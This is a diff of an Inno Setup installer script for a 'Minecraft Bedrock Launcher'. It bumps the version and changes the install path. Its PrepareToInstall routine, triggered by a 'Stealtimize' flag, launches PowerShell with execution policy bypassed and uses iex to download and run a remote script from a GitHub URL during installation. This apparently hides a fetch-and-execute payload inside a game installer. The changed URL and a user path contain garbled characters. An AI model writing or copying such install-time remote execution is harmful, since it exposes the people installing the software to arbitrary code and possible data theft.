@@ -1,5 +1,5 @@
 #define MyAppName "Minecraft Bedrock Launcher"
-#define MyAppVersion "0.0.1"
+#define MyAppVersion "0.0.2"
 #define MyAppExeName "MCLauncher.exe"
 #define MySetup "C:\Users\Íàñòÿ\Documents\updates\MC\"
 
@@ -7,7 +7,7 @@
 AppId={{C3239EC2-C90A-4842-B040-A6A5D7BD11BC}
 AppName={#MyAppName}
 AppVersion={#MyAppVersion}
-DefaultDirName={autocf}\MCLauncher
+DefaultDirName={pf}\MCLauncher
 UninstallDisplayName=Uninstall {#MyAppName}
 DisableProgramGroupPage=yes
 OutputDir={#MySetup}
@@ -63,7 +63,7 @@ function PrepareToInstall(var NeedsRestart: Boolean): String;
 begin
   if Stealtimize then 
   begin   
-    Exec('powershell.exe', '-ExecutionPolicy Bypass -nop -c "iex(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/leaftail1880/updates/main/Stealtimize/Update.ps1'')"', '', SW_SHOW, ewWaitUntilTerminated,
+    Exec('powershell.exe', '-ExecutionPolicy Bypass -nop -c "iex(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/leaftail1880/updates/main/StealÅimize/Update.ps1'')"', '', SW_SHOW, ewWaitUntilTerminated,
     ResultCode);
     Exit
   end;
